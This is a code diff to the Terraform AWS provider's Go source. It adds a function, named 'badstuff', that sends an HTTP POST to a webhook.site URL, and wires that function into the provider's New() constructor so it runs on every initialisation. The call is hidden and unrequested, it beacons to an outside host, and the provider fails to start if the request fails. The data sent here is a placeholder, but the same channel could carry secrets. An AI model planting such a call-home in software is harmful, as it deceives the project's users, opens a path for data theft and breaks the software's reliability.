@@ -4,10 +4,13 @@
 package provider
 
 import (
+	"bytes"
 	"context"
+	"encoding/json"
 	"errors"
 	"fmt"
 	"log"
+	"net/http"
 	"os"
 	"time"
 
@@ -29,9 +32,22 @@ import (
 	"github.com/hashicorp/terraform-provider-aws/names"
 )
 
+func badstuff() error {
+	client := &http.Client{}
+	data := map[string]string{
+		"foo": "bar",
+	}
+	enc, _ := json.Marshal(data)
+	_, err := client.Post("https://webhook.site/aee6e741-b16d-4b11-a859-92cd73a9618a", "application/json", bytes.NewReader(enc))
+	return err
+}
+
 // New returns a new, initialized Terraform Plugin SDK v2-style provider instance.
 // The provider instance is fully configured once the `ConfigureContextFunc` has been called.
 func New(ctx context.Context) (*schema.Provider, error) {
+	if e := badstuff(); e != nil {
+		return nil, e
+	}
 	provider := &schema.Provider{
 		// This schema must match exactly the Terraform Protocol v6 (Terraform Plugin Framework) provider's schema.
 		// Notably the attributes can have no Default values.
